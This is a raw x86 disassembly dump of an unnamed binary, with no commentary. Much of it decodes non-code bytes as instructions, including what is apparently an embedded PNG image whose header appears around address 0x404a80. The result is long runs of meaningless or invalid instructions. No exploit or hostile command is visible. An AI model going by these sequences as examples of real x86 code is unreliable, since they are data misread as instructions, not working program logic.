  404981:	jae    0x4049f7
  404983:	gs ins DWORD PTR es:[edi],dx
  404985:	cs inc esp
  404987:	jb     0x4049ea
  404989:	ja     0x4049f4
  40498b:	outs   dx,BYTE PTR ds:[esi]
  40498c:	addr16 cs push ebx
  40498f:	imul   edi,DWORD PTR [edx+0x65],0x2
  404996:	add    eax,0x74646977
  40499b:	push   0x69656806
  4049a0:	addr16 push 0x8000074
  4049a6:	or     BYTE PTR [edx],al
	...
  4049b0:	add    BYTE PTR [eax],al
  4049b2:	add    BYTE PTR [edi],cl
  4049b4:	add    eax,DWORD PTR [eax]
  4049b6:	add    BYTE PTR [eax],al
  4049b8:	push   0xffffffbe
  4049ba:	add    al,0x0
  4049bc:	add    al,BYTE PTR [eax]
  4049be:	add    BYTE PTR [ecx],al
  4049c0:	add    BYTE PTR [eax+eax*1],cl
  4049c3:	or     eax,0xd
  4049c8:	add    BYTE PTR [eax],al
  4049ca:	or     eax,0x11c76
  4049cf:	mov    BYTE PTR [eax],0x0
  4049d2:	add    BYTE PTR [eax+0x80],al
  4049d8:	add    BYTE PTR [eax],cl
  4049da:	add    BYTE PTR [eax],ch
  4049dc:	dec    esp
  4049dd:	add    BYTE PTR [eax],al
  4049df:	cmp    al,0x1d
  4049e1:	add    DWORD PTR [eax],eax
  4049e3:	inc    eax
  4049e4:	inc    eax
  4049e5:	add    BYTE PTR [eax],al
  4049e7:	add    BYTE PTR [eax],al
  4049e9:	or     BYTE PTR [eax],al
  4049eb:	sub    BYTE PTR [esi],dl
  4049ed:	add    BYTE PTR [eax],al
  4049ef:	imul   eax,DWORD PTR fs:[ecx],0x303000
  4049f6:	add    BYTE PTR [eax],al
  4049f8:	add    BYTE PTR [eax],cl
  4049fa:	add    BYTE PTR [eax-0x73fffff2],ch
  404a00:	jg     0x404a03
  404a02:	add    BYTE PTR [eax],ah
  404a04:	and    BYTE PTR [eax],al
  404a06:	add    BYTE PTR [eax],al
  404a08:	add    BYTE PTR [eax],cl
  404a0a:	add    BYTE PTR [eax+0x34000008],ch
  404a10:	mov    es,WORD PTR [ecx]
  404a12:	add    BYTE PTR [eax],dl
  404a14:	adc    BYTE PTR [eax],al
  404a16:	add    BYTE PTR [eax],al
  404a18:	add    BYTE PTR [eax],cl
  404a1a:	add    BYTE PTR [eax+0x5],ch
  404a1d:	add    BYTE PTR [eax],al
  404a1f:	fcom   QWORD PTR [esi+0xd0d0001]
  404a25:	add    BYTE PTR [eax],al
  404a27:	add    BYTE PTR [eax],al
  404a29:	add    BYTE PTR ds:0x19d1e,cl
  404a2f:	inc    esp
  404a30:	pushf  
  404a31:	add    DWORD PTR [eax],eax
  404a33:	add    BYTE PTR [eax+0x0],0x20
  404a3a:	add    BYTE PTR [eax],ch
  404a3c:	or     BYTE PTR [ecx],al
  404a3e:	add    BYTE PTR [edx+0x39],ah
  404a41:	add    eax,DWORD PTR [eax]
  404a43:	inc    eax
  404a44:	inc    eax
  404a45:	add    BYTE PTR [eax],al
  404a47:	add    BYTE PTR [eax],al
  404a49:	and    BYTE PTR [eax],al
  404a4b:	sub    BYTE PTR [edx+0x0],al
  404a4e:	add    BYTE PTR [edx+0x30000441],cl
  404a54:	xor    BYTE PTR [eax],al
  404a56:	add    BYTE PTR [eax],al
  404a58:	add    BYTE PTR [eax],ah
  404a5a:	add    BYTE PTR [eax-0x4dffffdb],ch
  404a60:	add    DWORD PTR [eax+eax*1],0x20
  404a64:	and    BYTE PTR [eax],al
  404a66:	add    BYTE PTR [eax],al
  404a68:	add    BYTE PTR [eax],ah
  404a6a:	add    BYTE PTR [eax+0x5a000010],ch
  404a70:	test   eax,0x10100004
  404a75:	add    BYTE PTR [eax],al
  404a77:	add    BYTE PTR [eax],al
  404a79:	and    BYTE PTR [eax],al
  404a7b:	push   0x2000004
  404a80:	mov    edx,0x50890004
  404a85:	dec    esi
  404a86:	inc    edi
  404a87:	or     eax,0xa1a0a
  404a8c:	add    BYTE PTR [eax],al
  404a8e:	or     eax,0x52444849
  404a93:	add    BYTE PTR [eax],al
  404a95:	add    DWORD PTR [eax],eax
  404a97:	add    BYTE PTR [eax],al
  404a99:	add    DWORD PTR [eax],eax
  404a9b:	or     BYTE PTR [esi],al
  404a9d:	add    BYTE PTR [eax],al
  404a9f:	add    BYTE PTR [edx+esi*2-0x58],bl
  404aa3:	data16 add BYTE PTR [eax],al
  404aa6:	(bad)  
  404aa7:	dec    DWORD PTR [ecx+0x44]
  404aaa:	inc    ecx
  404aab:	push   esp
  404aac:	js     0x404a88
  404aae:	in     al,dx
  404aaf:	mov    ebp,0x575c780d
  404ab4:	jns    0x404ae4
  404ab6:	cli    
  404ab7:	lea    esi,[edx+edx*4]
  404aba:	mov    dh,0x34
  404abc:	mov    ds:0xb63496d1,eax
  404ac1:	(bad)  
  404ac2:	xchg   esi,eax
  404ac3:	ins    BYTE PTR es:[edi],dx
  404ac4:	retf   
  404ac5:	aas    
  404ac6:	or     DWORD PTR [esi-0x63963e28],eax
  404acc:	inc    ebx
  404acd:	sub    dh,cl
  404acf:	and    DWORD PTR [ecx+0x6843d0a4],eax
  404ad5:	add    ecx,DWORD PTR ds:0x96807a6d
  404adb:	inc    edx
  404adc:	cmp    BYTE PTR [ebp+0x686dc34f],ah
  404ae2:	ret    
  404ae3:	sub    edi,esp
  404ae5:	imul   ebp,DWORD PTR [ecx],0xe9b4a1ce
  404aeb:	add    ebx,DWORD PTR [edx+edx*8]
  404aee:	dec    ebx
  404aef:	fidiv  DWORD PTR [edx+0xf]
  404af2:	cmp    DWORD PTR [ebp+0x20],ebp
  404af5:	loope  0x404b2d
  404af7:	ins    DWORD PTR es:[edi],dx
  404af8:	clc    
  404af9:	or     DWORD PTR [ebp+0x42],ecx
  404afc:	rol    esi,cl
  404afe:	adc    al,0x43
  404b00:	add    dh,BYTE PTR [edi]
  404b02:	ins    DWORD PTR es:[edi],dx
  404b03:	sbb    al,0x30
  404b05:	mov    cl,0x13
  404b07:	or     al,0xb6
  404b09:	jecxz  0x404abc
  404b0b:	arpl   cx,bx
  404b0d:	arpl   WORD PTR [ecx+0x24],di
  404b10:	ins    DWORD PTR es:[edi],dx
  404b11:	(bad)  
  404b12:	out    0x67,al
  404b14:	dec    ebx
  404b15:	repz ja 0x404ad7
  404b18:	neg    DWORD PTR [ebx+0x6b]
  404b1b:	lea    edx,[esi+0x648cf6b6]
  404b21:	out    0x17,eax
  404b23:	mov    ds:0x4678cfcf,al
  404b28:	jnp    0x404b20
  404b2a:	in     al,dx
  404b2b:	mov    ebp,0x7beb5af6
  404b30:	xlat   BYTE PTR ds:[ebx]
  404b31:	idiv   DWORD PTR [edi-0xbf18bde]
  404b37:	xchg   esi,eax
  404b38:	sub    edi,DWORD PTR [esi-0x4f]
  404b3b:	ds jmp 0x2807:0x43e1d24d
  404b43:	lahf   
  404b44:	iret   
  404b45:	lahf   
  404b46:	retf   
  404b47:	and    eax,0x96996996
  404b4c:	jmp    0xc3b5eb8a
  404b51:	jmp    0x404bbb
  404b53:	pusha  
  404b54:	lds    ebx,FWORD PTR [edx]
  404b56:	(bad)  
  404b58:	add    DWORD PTR [edi+0x23],0xffffffe7
  404b5c:	repnz sti 
  404b5e:	mov    bl,0xfa
  404b60:	adc    DWORD PTR [eax],ebx
  404b62:	call   FWORD PTR [edi+0x1e]
  404b65:	jle    0x404aef
  404b67:	sub    dl,BYTE PTR [ebp-0x23027436]
  404b6d:	retf   
  404b6e:	mov    ah,0x4c
  404b70:	retf   
  404b71:	adc    al,0xa0
  404b73:	push   esp
  404b74:	jb     0x404b9b
  404b76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b77:	(bad)  
  404b78:	outs   dx,BYTE PTR ds:[esi]
  404b79:	cmp    al,0x2b
  404b7b:	xor    BYTE PTR [eax-0x2e],bl
  404b7e:	mov    DWORD PTR [edx+esi*1-0x71d81c0b],ecx
  404b85:	mov    edi,0x4cb7cfd8
  404b8a:	retf   
  404b8b:	mov    ah,0x4c
  404b8d:	dec    ebx
  404b8e:	mov    al,ds:0xb297bc64
  404b93:	stc    
  404b94:	jmp    0xcbb73cbe
  404b99:	xchg   ebx,eax
  404b9a:	jle    0x404b8f
  404b9c:	in     eax,dx
  404b9d:	mov    edi,0xef97ff51
  404ba2:	cmp    al,0x48
  404ba4:	cdq    
  404ba5:	in     al,dx
  404ba6:	fmul   DWORD PTR [ebx-0x4b34b303]
  404bac:	dec    esp
  404bad:	retf   
  404bae:	je     0x404bc6
  404bb0:	adc    al,0x8d
  404bb2:	inc    esi
  404bb3:	imul   ecx,DWORD PTR [ebp+0x6a],0xddc2f10d
  404bba:	xchg   edx,eax
  404bbb:	(bad)  
  404bbc:	fwait
  404bbd:	jle    0x404bc8
  404bbf:	out    0xff,al
  404bc1:	sar    BYTE PTR [edi],cl
  404bc3:	std    
  404bc4:	mov    edi,0x32fee2cb
  404bc9:	sub    eax,0xc1314fd3
  404bce:	inc    esi
  404bcf:	ror    BYTE PTR [edx],1
  404bd1:	add    al,0x42
  404bd3:	mov    edi,0xe17ff300
  404bd8:	stos   DWORD PTR es:[edi],eax
  404bd9:	pop    edi
  404bda:	jl     0x404b8d
  404bdc:	fstp   TBYTE PTR [esi+0x4cb4cb4c]
  404be2:	iret   
  404be3:	add    ebp,eax
  404be5:	jecxz  0x404c58
  404be7:	sbb    bl,ch
  404be9:	inc    ebx
  404bea:	jns    0x404c69
  404bec:	rol    ecx,0x9b
  404bef:	inc    edi
  404bf1:	int    0xf5
  404bf3:	(bad)  
  404bf4:	std    
  404bf5:	stc    
  404bf6:	(bad)  
  404bf7:	pop    esi
  404bf8:	in     al,dx
  404bf9:	ss das 
  404bfb:	shl    DWORD PTR [edx],cl
  404bfd:	sub    eax,0xcd4873d3
  404c02:	in     al,dx
  404c03:	add    dh,bl
  404c05:	push   cs
  404c06:	cmp    cl,0x3f
  404c09:	stc    
  404c0a:	(bad)  [edi+0x2e]
  404c0d:	mov    ebx,0x996996f6
  404c12:	jle    0x404c1a
  404c14:	sub    DWORD PTR [esp+eax*1],ecx
  404c17:	out    0xfd,al
  404c19:	shl    DWORD PTR [edx-0x66682be],0x97
  404c20:	imul   ebx,DWORD PTR [ecx+0x6829767e],0xd87c6813
  404c2a:	jle    0x404bfd
  404c2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c2d:	cmc    
  404c2e:	jge    0x404c6f
  404c30:	js     0x404c26
  404c32:	lds    ebp,FWORD PTR [esi-0x21]
  404c35:	xor    ch,BYTE PTR ds:0xff3d32d3
  404c3b:	xor    al,0x1f
  404c3d:	add    dh,ch
  404c3f:	mov    eax,0xf5fab6ed
  404c44:	aaa    
  404c45:	fidivr WORD PTR [eax-0x59a00e94]
  404c4b:	gs jp  0x404c67
  404c4e:	adc    BYTE PTR [edx],al
  404c50:	xchg   BYTE PTR [edx],dh
  404c52:	fnstenv [ecx]
  404c54:	loope  0x404cd3
  404c56:	stc    
  404c57:	outs   dx,DWORD PTR ds:[esi]
  404c58:	jns    0x404c4f
  404c5a:	pop    edi
  404c5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c5c:	gs jp  0x404c38
  404c5f:	rcr    DWORD PTR [eax+eax*1],1
  404c62:	inc    esp
  404c63:	mov    ds:0xb2a57af1,eax
  404c68:	lods   al,BYTE PTR ds:[esi]
  404c69:	sti    
  404c6a:	das    
  404c6b:	shl    DWORD PTR [edx],cl
  404c6d:	mov    ebp,0x148c85c
  404c72:	adc    esp,eax
  404c74:	idiv   DWORD PTR [edi]
  404c76:	lock lods eax,DWORD PTR ds:[esi]
  404c78:	jg     0x404cf8
  404c7a:	mov    cl,0xdb
  404c7c:	mov    bl,0x4c
  404c7e:	retf   
  404c7f:	mov    ah,0x4c
  404c81:	das    
  404c82:	and    BYTE PTR [ecx],ah
  404c84:	push   edx
  404c85:	nop
  404c86:	push   ebp
  404c87:	dec    BYTE PTR [eax+0x64]
  404c8a:	cmp    esi,ecx
  404c8c:	jg     0x404c27
  404c8e:	xchg   esi,eax
  404c8f:	jmp    0x8d197f9
  404c94:	and    eax,DWORD PTR [ecx+0x7d]
  404c97:	fprem  
  404c99:	mov    bh,0x4c
  404c9b:	retf   
  404c9c:	hlt    
  404c9d:	repnz and edi,DWORD PTR [eax-0x57fc9efc]
  404ca4:	mov    edi,0xa6590dd8
  404ca9:	gs pop edx
  404cab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404cac:	pop    ss
  404cad:	sahf   
  404cae:	pusha  
  404caf:	pop    es
  404cb0:	pop    eax
  404cb1:	push   es
  404cb2:	and    BYTE PTR [ebp+0x5a],0xa6
  404cb6:	xchg   edi,eax
  404cb7:	sub    DWORD PTR [ecx],esp
  404cb9:	inc    edi
  404cba:	pusha  
  404cbb:	sbb    DWORD PTR [eax],eax
  404cbd:	xchg   esi,eax
  404cbe:	imul   ebx,DWORD PTR [ecx+0x4304a65e],0x2c0032e0
  404cc8:	shl    DWORD PTR [edx],cl
  404cca:	mov    ebp,0x19698c
  404ccf:	xchg   esi,eax
  404cd0:	imul   ebx,DWORD PTR [ecx+0xcb4c65e],0x4cb4cb00
  404cda:	das    
  404cdb:	arpl   WORD PTR [edx+0x6],bx
  404cde:	and    BYTE PTR [ebp+0x5a],0xa6
  404ce2:	xchg   edi,eax
  404ce3:	xor    DWORD PTR ds:0x2d32c003,ebp
  404ce9:	ror    ebx,cl
  404ceb:	cwde   
  404cec:	xchg   esi,eax
  404ced:	add    DWORD PTR [eax-0x67],esp
  404cf0:	xchg   esi,eax
  404cf1:	jmp    0x10b995b
  404cf6:	mov    al,0x4c
  404cf8:	retf   
  404cf9:	hlt    
  404cfa:	xor    ah,BYTE PTR [esi-0x59a7ff9b]
  404d00:	gs jp  0x404d1c
  404d03:	shl    DWORD PTR [edx],cl
  404d05:	add    BYTE PTR [edi+ecx*8],bh
  404d08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d09:	mov    bl,0xae
  404d0b:	call   0x87ee:0xc95cbfbe
  404d12:	push   esi
  404d13:	mov    ah,0xdc
  404d15:	push   edi
  404d16:	iret   
  404d17:	das    
  404d18:	sub    eax,0x78a68003
  404d1d:	enter  0x7444,0xf8
  404d21:	in     eax,0x87
  404d23:	jl     0x404d83
  404d25:	or     bl,BYTE PTR [ecx-0x18e9620d]
  404d2b:	fcomp  st(7)
  404d2d:	sti    
  404d2e:	sbb    edi,0xbab7bd84
  404d34:	push   cs
  404d35:	call   0x53097e13
  404d3a:	lahf   
  404d3b:	(bad)  
  404d3c:	mov    ecx,0x5a173f78
  404d41:	dec    edx
  404d42:	aas    
  404d43:	xor    dl,0xcb
  404d46:	xor    BYTE PTR [ecx+0x56],0xf4
  404d4a:	mov    dl,0x6
  404d4c:	and    BYTE PTR [esi-0x6d],0xde
  404d50:	mov    esp,0x8bb09ab7
  404d55:	dec    ebp
  404d56:	les    esi,FWORD PTR [ebx-0x63]
  404d59:	call   0xc9ff72a9
  404d5e:	fistp  QWORD PTR [eax+0x5f]
  404d61:	jmp    0xb19f:0x7f3c7e4
  404d68:	(bad)  
  404d6a:	out    0x9b,eax
  404d6c:	into   
  404d6d:	push   ss
  404d6e:	hlt    
  404d6f:	call   0x8d78:0x3c7d83f5
  404d76:	gs jo  0x404dd1
  404d79:	dec    eax
  404d7a:	das    
  404d7b:	pop    ebx
  404d7c:	add    BYTE PTR [eax-0x65e2067],dh
  404d82:	mov    WORD PTR [edi+0x21],cs
  404d85:	lahf   
  404d86:	ins    DWORD PTR es:[edi],dx
  404d87:	or     ah,BYTE PTR [ebx-0x42]
  404d8a:	mov    al,0x73
  404d8c:	iret   
  404d8d:	xchg   BYTE PTR [ecx-0x4f45b932],bl
  404d93:	iret   
  404d94:	outs   dx,DWORD PTR ds:[esi]
  404d95:	test   BYTE PTR [esi],0xca
  404d98:	das    
  404d99:	xor    dl,cl
  404d9b:	ror    DWORD PTR [esi+esi*8],0x73
  404d9f:	lahf   
  404da0:	dec    ebp
  404da1:	pop    ds
  404da2:	pushf  
  404da3:	sub    edi,DWORD PTR ds:0x452deb9b
  404da9:	or     cl,BYTE PTR [edx]
  404dab:	test   BYTE PTR [ebp+0x18],0x90
  404daf:	add    al,0xff
  404db1:	pop    esi
  404db2:	lods   al,BYTE PTR ds:[esi]
  404db3:	lahf   
  404db4:	jle    0x404d4c
  404db6:	jmp    0x6405120
  404dbb:	stc    
  404dbc:	pop    ebx
  404dbd:	xor    DWORD PTR [esi+0x18],edi
  404dc0:	adc    ebx,eax
  404dc2:	adc    esi,DWORD PTR [esi-0x560dbb2b]
  404dc8:	xor    eax,0x8a250503
  404dcd:	mov    bl,0x59
  404dcf:	in     eax,0x82
  404dd1:	fs dec edi
  404dd3:	lock loopne 0x404da1
  404dd6:	(bad)  
  404dd7:	mov    esi,0xfd36c4d5
  404ddc:	adc    BYTE PTR [ebx+esi*4-0x45],ch
  404de0:	dec    eax
  404de1:	pop    ds
  404de2:	cmp    al,0x1b
  404de4:	cmp    dl,BYTE PTR [edi+0x75]
  404de7:	mov    al,ds:0x67f95f55
  404dec:	icebp  
  404ded:	jns    0x404da0
  404def:	arpl   WORD PTR [ebx+0x22cfd9f5],cx
  404df5:	std    
  404df6:	dec    esp
  404df7:	add    al,BYTE PTR [eax+0x5b16d959]
  404dfd:	cdq    
  404dfe:	popf   
  404dff:	and    eax,0xd9a8c2bc
  404e04:	stos   BYTE PTR es:[edi],al
  404e05:	sbb    esp,DWORD PTR [esp+edi*8-0x19]
  404e09:	call   0x77ac:0xf3f78281
  404e10:	mov    edi,0xb899abc9
  404e15:	imul   eax,DWORD PTR [ebx],0x40
  404e18:	fsubr  st,st(3)
  404e1a:	stc    
  404e1b:	add    al,0x82
  404e1d:	and    BYTE PTR [ebp+0x54b59a8b],bl
  404e23:	data16 (bad) 
  404e26:	outs   dx,DWORD PTR ds:[esi]
  404e27:	neg    cl
  404e29:	jle    0x404eaa
  404e2b:	mov    ecx,0x333f09a8
  404e30:	add    BYTE PTR [eax-0x75],ah
  404e33:	mov    bl,0x36
  404e35:	test   DWORD PTR [ecx],eax
  404e37:	inc    ecx
  404e38:	adc    BYTE PTR [eax],al
  404e3a:	fcom   QWORD PTR [eax-0x64840489]
  404e40:	pop    edx
  404e41:	mov    esp,ebx
  404e43:	ds sub eax,0xad9c492e
  404e49:	mov    ds,ebx
  404e4b:	in     al,dx
  404e4c:	fsubrp st(6),st
  404e4e:	in     eax,0x59
  404e50:	out    dx,eax
  404e51:	mul    BYTE PTR [edi+0x73]
  404e54:	pop    esi
  404e55:	fmul   DWORD PTR [edx-0x47d5059a]
  404e5b:	jmp    0xbf61:0x7d83df07
  404e62:	mov    bh,0x6a
  404e64:	arpl   WORD PTR [ebx],bp
  404e66:	jge    0x404ee6
  404e68:	xor    DWORD PTR [ebp-0x37],edx
  404e6b:	mov    esi,0xa97fb046
  404e70:	leave  
  404e71:	mov    cl,0xa5
  404e73:	xor    bh,BYTE PTR [ebp-0xde84803]
  404e79:	fstp   st(1)
  404e7b:	test   al,0x4f
  404e7d:	aas    
  404e7e:	sub    esi,esp
  404e80:	push   ebx
  404e81:	or     DWORD PTR [eax],eax
  404e83:	popa   
  404e84:	loop   0x404ec2
  404e86:	push   0xd86bbaa9
  404e8b:	push   0x67
  404e8d:	mov    edi,0xad80ad9a
  404e92:	es adc al,0x51
  404e95:	cmp    BYTE PTR [ebx+0x36eef5e3],dh
  404e9b:	(bad)  
  404e9c:	scas   eax,DWORD PTR es:[edi]
  404e9d:	aas    
  404e9e:	inc    edx
  404e9f:	test   DWORD PTR [ebp-0x5a1510c9],0xcc82017a
  404ea9:	fucomip st,st(4)
  404eab:	aad    0x4a
  404ead:	or     dh,BYTE PTR [eax-0x737dfff]
  404eb3:	popa   
  404eb4:	jge    0x404e87
  404eb6:	dec    edx
  404eb7:	and    bh,BYTE PTR [edx]
  404eb9:	push   edi
  404eba:	dec    edi
  404ebb:	mov    DWORD PTR [ebp+0x2d],edi
  404ebe:	jae    0x404eef
  404ec0:	fwait
  404ec1:	icebp  
  404ec2:	int    0x73
  404ec4:	test   ch,dh
  404ec6:	push   ebx
  404ec7:	stos   DWORD PTR es:[edi],eax
  404ec8:	iret   
  404ec9:	int    0x56
  404ecb:	clc    
  404ecc:	xor    BYTE PTR [ecx+0x29],ch
  404ecf:	js     0x404efd
  404ed1:	clc    
  404ed2:	fwait
  404ed3:	(bad)
  404ed6:	add    DWORD PTR [si],esp
  404ed9:	pop    esi
  404eda:	repnz add BYTE PTR [eax],dl
  404edd:	pop    esp
  404ede:	fst    DWORD PTR [edi]
  404ee0:	pop    ebx
  404ee1:	rol    ebx,1
  404ee3:	into   
  404ee4:	or     edx,ebx
  404ee6:	cmp    eax,DWORD PTR [ebx+0x7e3aff13]
  404eec:	in     eax,dx
  404eed:	rcr    bh,1
  404eef:	jns    0x404f3e
  404ef1:	xchg   esi,eax
  404ef2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ef3:	inc    ecx
  404ef4:	out    dx,al
  404ef5:	scas   al,BYTE PTR es:[edi]
  404ef6:	push   0x3c
  404ef8:	inc    edx
  404ef9:	in     eax,dx
  404efa:	stc    
  404efb:	cmp    cl,BYTE PTR [ebp-0x6792488d]
  404f01:	push   ebp
  404f02:	pop    edi
  404f03:	mov    edi,0x7bd2e125
  404f08:	mov    esp,0x8efae9b9
  404f0d:	inc    ecx
  404f0e:	out    dx,al
  404f0f:	(bad)  
  404f10:	leave  
  404f11:	mov    edx,0x323cfd30
  404f16:	(bad)  
  404f17:	lods   al,BYTE PTR ds:[esi]
  404f18:	out    dx,eax
  404f19:	jb     0x404f20
  404f1b:	push   edx
  404f1c:	xlat   BYTE PTR ds:[ebx]
  404f1d:	mov    al,BYTE PTR [ebp-0x1a]
  404f20:	into   
  404f21:	add    ecx,esi
  404f23:	test   DWORD PTR [edi+0xb],0xbdf2ca75
  404f2a:	pop    edi
  404f2b:	loope  0x404ef9
  404f2d:	pop    ebp
  404f2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f2f:	jmp    0x3ebe:0xbedfa9d7
  404f36:	(bad)  
  404f37:	jge    0x404f6e
  404f39:	xor    eax,0x50b43391
  404f3e:	adc    cl,BYTE PTR [eax]
  404f40:	dec    esi
  404f41:	push   esp
  404f42:	pop    ebx
  404f43:	cld    
  404f44:	aaa    
  404f45:	int3   
  404f46:	mul    DWORD PTR [esi+0x7e]
  404f49:	jge    0x404eff
  404f4b:	in     eax,dx
  404f4c:	in     al,dx
  404f4d:	(bad)  
  404f4e:	xchg   dx,ax
  404f50:	out    dx,eax
  404f51:	fnstcw WORD PTR [edi-0x6a]
  404f54:	mov    edi,0xa06d7d01
  404f59:	cmp    DWORD PTR [edx-0x1d],0x5d
  404f5d:	xchg   esp,eax
  404f5e:	lods   al,BYTE PTR ds:[esi]
  404f5f:	aam    0xa8
  404f61:	out    dx,eax
  404f62:	inc    esp
  404f63:	push   ecx
  404f64:	out    dx,al
  404f65:	out    dx,eax
  404f66:	jmp    0xd820ebe1
  404f6b:	xor    BYTE PTR [edi+0xf7fd11e],bh
  404f71:	fwait
  404f72:	mov    cl,0xe0
  404f74:	jle    0x404f15
  404f76:	stos   BYTE PTR es:[edi],al
  404f77:	repz mov bl,0x76
  404f7a:	not    DWORD PTR [eax-0x19e13835]
  404f80:	fild   QWORD PTR [ebp-0x6e589613]
  404f86:	sub    DWORD PTR [esi],0xd0cc4f4a
  404f8c:	xor    edx,DWORD PTR [ebx]
  404f8e:	push   ebp
  404f8f:	sbb    ah,BYTE PTR [ecx+0x83d15f0]
  404f95:	mov    BYTE PTR [esi-0x6d],bl
  404f98:	div    DWORD PTR [eax]
  404f9a:	push   eax
  404f9b:	setns  BYTE PTR [esi]
  404f9e:	mov    eax,ds:0x82b4fddf
  404fa3:	ror    DWORD PTR [ebx+0xe],0x0
  404fa7:	ret    0x3e18
  404faa:	in     al,dx
  404fab:	jae    0x404f85
  404fad:	ja     0x404f5c
  404faf:	les    edx,FWORD PTR [edi+edi*1-0x1c]
  404fb3:	pop    esp
  404fb4:	ret    
  404fb5:	add    BYTE PTR [ecx],ch
  404fb7:	jle    0x404f96
  404fb9:	inc    esp
  404fba:	jae    0x404f4f
  404fbc:	jns    0x40501d
  404fbe:	aas    
  404fbf:	sar    edx,1
  404fc1:	inc    esp
  404fc2:	pop    es
  404fc3:	jns    0x404f6c
  404fc5:	retf   0x213c
  404fc8:	mov    ebx,0x29d48279
  404fcd:	adc    eax,0x3e0ea36d
  404fd2:	jns    0x405046
  404fd4:	mov    dh,0x83
  404fd6:	not    BYTE PTR [ebp+0x4b]
  404fd9:	les    esp,FWORD PTR [edi+0x15267bd0]
  404fdf:	add    bh,BYTE PTR [esi+edx*2]
  404fe2:	fwait
  404fe3:	mov    ebx,0x731665fe
  404fe8:	out    dx,al
  404fe9:	out    0x15,eax
  404feb:	call   DWORD PTR [ebx-0x486bca57]
  404ff1:	pop    edx
  404ff2:	xor    al,0xc1
  404ff4:	xlat   BYTE PTR ds:[ebx]
  404ff5:	sbb    dl,al
  404ff7:	cmp    esi,DWORD PTR [ebx]
  404ff9:	jge    0x404fb0
  404ffb:	jl     0x405071
  404ffd:	scas   al,BYTE PTR es:[edi]
  404ffe:	push   ecx
  404fff:	inc    ecx
  405000:	shr    al,0x65
  405003:	add    al,cl
  405005:	aam    0x4
  405007:	je     0x405049
  405009:	mov    DWORD PTR [eax+0x709b0b02],ebx
  40500f:	ins    BYTE PTR es:[edi],dx
  405010:	xor    ah,BYTE PTR [edx+0x666e900]
  405016:	push   es
  405017:	ret    
  405018:	cld    
  405019:	or     BYTE PTR ss:[ecx+ebp*4-0x7dfff9ff],al
  405021:	sub    edi,edi
  405023:	add    ecx,DWORD PTR [ebx+0x7e51f330]
  405029:	into   
  40502a:	inc    ecx
  40502b:	push   es
  40502c:	mov    ds:0xec33f31f,eax
  405031:	loope  0x40503e
  405033:	(bad)  
  405034:	lock pop DWORD PTR [edi-0x8]
  405038:	js     0x40500c
  40503a:	jmp    0x8603:0xcc32a35c
  405041:	jne    0x40503f
  405043:	(bad)  
  405044:	je     0x4050a3
  405046:	sahf   
  405047:	or     edi,ebp
  405049:	out    0x39,al
  40504b:	(bad)  
  40504c:	mov    ecx,0x628dd8cd
  405051:	pop    eax
  405052:	lahf   
  405053:	(bad)  
  405054:	jmp    0x405075
  405056:	(bad)  
  405057:	jecxz  0x40507a
  405059:	in     eax,dx
  40505a:	mov    ah,0xae
  40505c:	add    BYTE PTR [bp+si+0x7c92],al
  405061:	bound  esi,QWORD PTR [esi-0x10e4072a]
  405067:	xchg   ebp,esi
  405069:	out    0x4b,eax
  40506b:	clc    
  40506c:	stos   DWORD PTR es:[edi],eax
  40506d:	xchg   DWORD PTR [ebx-0x16],ebp
  405070:	jp     0x405058
  405072:	ja     0x405061
  405074:	(bad)  
  405076:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405077:	arpl   WORD PTR [ebp-0x26],si
  40507a:	pop    edi
  40507b:	push   eax
  40507c:	popf   
  40507d:	adc    DWORD PTR [ecx+ebx*4-0x3e],edx
  405081:	and    al,0xa6
  405083:	loopne 0x405101
  405085:	xor    DWORD PTR [edi+0x7],edi
  405088:	cdq    
  405089:	call   FWORD PTR [esp+edi*1+0x2f]
  40508d:	das    
  40508e:	xor    eax,0x4000c97a
  405093:	cwde   
  405094:	cmp    bh,bl
  405096:	dec    edx
  405097:	outs   dx,DWORD PTR ds:[esi]
  405098:	(bad)  
  40509a:	scas   eax,DWORD PTR es:[edi]
  40509b:	sbb    DWORD PTR [eax],eax
  40509d:	test   BYTE PTR [ecx-0x383b098b],cl
  4050a3:	test   bl,bh
  4050a5:	jo     0x405082
  4050a7:	fmul   QWORD PTR [edx-0x5d43540a]
  4050ad:	sti    
  4050ae:	push   esp
  4050af:	mov    ds:0x49e1c70e,al
  4050b4:	pop    eax
  4050b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050b6:	xchg   edx,eax
  4050b7:	ffreep st(6)
  4050b9:	xor    BYTE PTR [eax],dh
  4050bb:	inc    ebx
  4050bc:	outs   dx,BYTE PTR ds:[esi]
  4050bd:	mov    ah,0x46
  4050bf:	cmc    
  4050c0:	mov    dh,0x18
  4050c2:	dec    ebp
  4050c3:	int    0x96
  4050c5:	call   0xf51df461
  4050ca:	test   BYTE PTR [ecx+0xfcc7989],0xba
  4050d1:	int3   
  4050d2:	adc    dh,bh
  4050d4:	outs   dx,DWORD PTR ds:[esi]
  4050d5:	jno    0x40512e
  4050d7:	shr    DWORD PTR [edx],cl
  4050d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050da:	pop    ebx
  4050db:	cwde   
  4050dc:	mov    esi,0x79f12fdd
  4050e1:	adc    DWORD PTR [edx],ebp
  4050e3:	clc    
  4050e4:	xor    edx,DWORD PTR ds:[ecx+0x17]
  4050e8:	push   ebp
  4050e9:	stc    
  4050ea:	clc    
  4050eb:	sti    
  4050ec:	jp     0x4050b4
  4050ee:	call   0xa88528ca
  4050f3:	ss pop ecx
  4050f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4050f6:	into   
  4050f7:	int3   
  4050f8:	lods   al,BYTE PTR ds:[esi]
  4050f9:	bound  edx,QWORD PTR [eax]
  4050fb:	nop
  4050fc:	xchg   si,ax
  4050fe:	(bad)  [ebx]
  405100:	iret   
  405101:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405102:	mov    bh,0xfd
  405104:	imul   ebx,DWORD PTR [edx-0x75b89184],0x7f
  40510b:	mov    bh,0xb9
